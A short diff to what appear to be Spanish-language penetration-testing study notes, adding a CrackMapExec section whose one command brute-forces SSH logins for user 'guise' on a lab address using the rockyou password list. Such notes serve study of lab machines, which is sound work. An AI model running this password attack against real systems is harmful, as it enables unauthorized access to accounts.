@@ -765,6 +765,13 @@ ADJUNTAR AQUI ENLACE A SCRIPTS
 
 Un ejemplo bastante bueno de este tipo de ataque con python está en la máquina **Blunder**.
 
+**CRACKMAPEXEC**
+
+A ssh:
+```
+> crackmapexec ssh 10.10.11.166 -u guise -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
+```
+
 ---
 
 ## XSS - Cross Site Scripting
